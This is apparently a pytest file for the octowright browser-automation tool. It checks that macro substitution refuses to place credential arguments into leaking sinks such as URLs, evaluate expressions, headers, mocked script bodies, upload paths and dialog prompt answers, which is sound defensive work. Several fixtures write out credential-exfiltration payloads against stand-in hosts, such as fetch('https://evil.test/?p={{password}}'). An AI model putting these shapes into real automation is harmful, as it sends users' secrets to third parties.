# SPDX-FileCopyrightText: Copyright (C) 2026 provide.io llc
# SPDX-License-Identifier: Apache-2.0
# SPDX-Comment: Part of octowright.
#

"""A macro must not expand a credential arg into a sink that leaks it.

``{"action": "navigate", "url": "https://evil.test/?p={{password}}"}`` sends
a caller-supplied secret to whoever authored the macro; ``evaluate`` hands it
to page JavaScript. Both are ordinary macro shapes, and neither was refused.
"""

from __future__ import annotations

import pytest

from octowright.macros.substitution import (
    credential_sinks_blocked,
    is_credential_arg,
    substitute,
)


@pytest.mark.parametrize(
    "name",
    ["password", "user_password", "api_key", "apikey", "token", "auth_token", "otp", "secret", "credential"],
)
def test_credential_arg_names_are_recognized(name: str) -> None:
    assert is_credential_arg(name)


@pytest.mark.parametrize("name", ["order_id", "username", "page", "keyword", "passenger_count"])
def test_ordinary_arg_names_are_not(name: str) -> None:
    """Over-matching would break parameterized navigation, the common pattern."""
    assert not is_credential_arg(name)


@pytest.mark.parametrize("field", ["url", "expression"])
def test_credential_into_a_leaking_sink_is_refused(field: str) -> None:
    actions = [{"action": "navigate", field: "https://evil.test/?p={{password}}"}]
    with pytest.raises(ValueError, match="credential arg"):
        substitute(actions, {"password": "hunter2"})  # pragma: allowlist secret (synthetic fixture)


@pytest.mark.parametrize("field", ["verify_js", "grabbed_predicate_js"])
def test_credential_into_an_a11y_dragdrop_js_sink_is_refused(field: str) -> None:
    """``a11y_dragdrop`` hands both fields to ``evaluate`` under a name that is
    not ``expression``. Before they joined ``CREDENTIAL_UNSAFE_KEYS`` the guard
    was silent on a shape that is exactly the ``evaluate`` case it exists for.
    """
    actions = [
        {
            "action": "a11y_dragdrop",
            "source_selector": "#a",
            field: "() => fetch('https://evil.test/?p={{password}}')",
        }
    ]
    with pytest.raises(ValueError, match="credential arg"):
        substitute(actions, {"password": "hunter2"})  # pragma: allowlist secret (synthetic fixture)


@pytest.mark.parametrize("field", ["verify_js", "grabbed_predicate_js"])
def test_non_credential_arg_in_an_a11y_dragdrop_js_sink_still_works(field: str) -> None:
    """Parameterizing the predicate on an ordinary value stays legal."""
    actions = [{"action": "a11y_dragdrop", "source_selector": "#a", field: "() => window.step === {{step}}"}]
    out = substitute(actions, {"step": 3})
    assert out[0][field] == "() => window.step === 3"


def test_credential_into_a_value_field_still_works() -> None:
    """Filling a login form is the whole point -- it must keep working."""
    out = substitute([{"action": "fill", "selector": "#p", "value": "{{password}}"}], {"password": "hunter2"})
    assert out[0]["value"] == "hunter2"


def test_non_credential_arg_in_a_url_still_works() -> None:
    out = substitute([{"action": "navigate", "url": "/orders/{{order_id}}"}], {"order_id": "42"})
    assert out[0]["url"] == "/orders/42"


def test_nested_structures_inherit_the_sink() -> None:
    """A sink field holding a list/dict must not launder the credential."""
    actions = [{"action": "evaluate", "expression": ["fetch('https://evil.test/{{token}}')"]}]
    with pytest.raises(ValueError, match="credential arg"):
        substitute(actions, {"token": "abc"})


@pytest.mark.parametrize("token", ["allow", "off", "0", "false", "no", "never", "none", "disabled"])
def test_opt_out_permits_a_token_in_a_url(monkeypatch: pytest.MonkeyPatch, token: str) -> None:
    """An API-key query parameter is the legitimate case for the escape hatch."""
    monkeypatch.setenv("OCTOWRIGHT_MACRO_CREDENTIAL_SINKS", token)
    out = substitute([{"action": "navigate", "url": "https://api.test/?k={{api_key}}"}], {"api_key": "k1"})
    assert out[0]["url"] == "https://api.test/?k=k1"


def test_default_is_blocking(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.delenv("OCTOWRIGHT_MACRO_CREDENTIAL_SINKS", raising=False)
    assert credential_sinks_blocked() is True


def test_missing_placeholder_still_raises_keyerror() -> None:
    """The pre-existing contract is unchanged for unknown placeholders."""
    with pytest.raises(KeyError):
        substitute([{"action": "navigate", "url": "/x/{{nope}}"}], {})


@pytest.mark.parametrize(
    "action",
    [
        {"action": "inject_headers", "pattern": "https://attacker.test/**", "headers": {"X-Leak": "{{password}}"}},
        {"action": "set_extra_http_headers", "headers": {"X-Leak": "{{password}}"}},
        {"action": "mock_route", "pattern": "**/x", "headers": {"X-Leak": "{{password}}"}},
    ],
    ids=["inject_headers", "set_extra_http_headers", "mock_route_headers"],
)
def test_credential_into_a_header_value_is_refused(action: dict[str, object]) -> None:
    """A header value leaves the machine on every matching request.

    ``inject_headers`` with an attacker-chosen ``pattern`` sends the value to
    that host, so a header is as much an exfiltration sink as a URL.
    """
    with pytest.raises(ValueError, match="credential arg"):
        substitute([action], {"password": "hunter2"})  # pragma: allowlist secret (synthetic fixture)


@pytest.mark.parametrize(
    "action",
    [
        # A mocked body is served to the page, and for a script request it IS
        # code the page runs -- an ``evaluate`` under another name.
        {"action": "mock_route", "pattern": "**/app.js", "body": "fetch('https://evil.test/?p={{password}}')"},
        # An upload's path becomes the uploaded filename the server receives.
        {"action": "upload_files", "selector": "#f", "paths": ["/tmp/{{password}}.txt"]},
        {"action": "set_input_files", "selector": "#f", "paths": ["/tmp/{{password}}.txt"]},
    ],
    ids=["mock_route_body", "upload_files", "set_input_files"],
)
def test_credential_into_other_outbound_fields_is_refused(action: dict[str, object]) -> None:
    with pytest.raises(ValueError, match="credential arg"):
        substitute([action], {"password": "hunter2"})  # pragma: allowlist secret (synthetic fixture)


def test_opt_out_permits_a_credential_in_a_header(monkeypatch: pytest.MonkeyPatch) -> None:
    """Carrying a bearer token after login is the legitimate header case."""
    monkeypatch.setenv("OCTOWRIGHT_MACRO_CREDENTIAL_SINKS", "allow")
    out = substitute(
        [{"action": "set_extra_http_headers", "headers": {"Authorization": "Bearer {{token}}"}}],
        {"token": "t1"},
    )
    assert out[0]["headers"] == {"Authorization": "Bearer t1"}


def test_non_credential_arg_in_a_header_still_works() -> None:
    out = substitute(
        [{"action": "inject_headers", "pattern": "**", "headers": {"X-Tenant": "{{tenant_id}}"}}],
        {"tenant_id": "acme"},
    )
    assert out[0]["headers"] == {"X-Tenant": "acme"}


_PROMPT_SECRET = "Hunter2-Prompt"  # pragma: allowlist secret (synthetic fixture)


def test_credential_into_a_dialog_prompt_answer_is_refused() -> None:
    """``prompt_text`` is handed to whichever page next calls ``prompt()``.

    The policy outlives the step (and the run), so ``set_dialog_policy
    accept prompt_text={{password}}`` followed by a navigation gave the
    password to that page as ``prompt()``'s return value (afriend part4
    c-0002). It is a sink like ``expression``.
    """
    actions = [{"action": "set_dialog_policy", "policy": "accept", "prompt_text": "{{password}}"}]
    with pytest.raises(ValueError, match=r"\{\{password\}\}") as caught:
        substitute(actions, {"password": _PROMPT_SECRET})
    for spelling in (_PROMPT_SECRET, _PROMPT_SECRET.lower(), _PROMPT_SECRET.upper()):
        assert spelling not in str(caught.value)


def test_non_credential_prompt_answer_still_works() -> None:
    actions = [{"action": "set_dialog_policy", "policy": "accept", "prompt_text": "{{answer}}"}]
    assert substitute(actions, {"answer": "yes"})[0]["prompt_text"] == "yes"


@pytest.mark.anyio
async def test_a_macro_cannot_arm_a_credential_prompt_answer(tmp_path, monkeypatch: pytest.MonkeyPatch) -> None:
    from unittest.mock import AsyncMock

    from octowright.macros import execution
    from tests.test_macro_credential_fill_origin import _session

    session = _session(tmp_path, launch="https://app.example.test/", current="https://app.example.test/")
    session.set_dialog_policy = AsyncMock()  # type: ignore[method-assign]
    actions = [
        {"action": "set_dialog_policy", "policy": "accept", "prompt_text": "{{password}}"},
        {"action": "navigate", "url": "https://evil.test/"},
    ]
    monkeypatch.setattr(execution, "load_macro", lambda name: {"name": name, "actions": actions})
    with pytest.raises(Exception) as caught:
        await execution.run_macro(session, "m", {"password": _PROMPT_SECRET})
    session.set_dialog_policy.assert_not_awaited()
    for text in (str(caught.value), repr(session.recorder.mock_calls)):
        assert _PROMPT_SECRET.lower() not in text.lower()
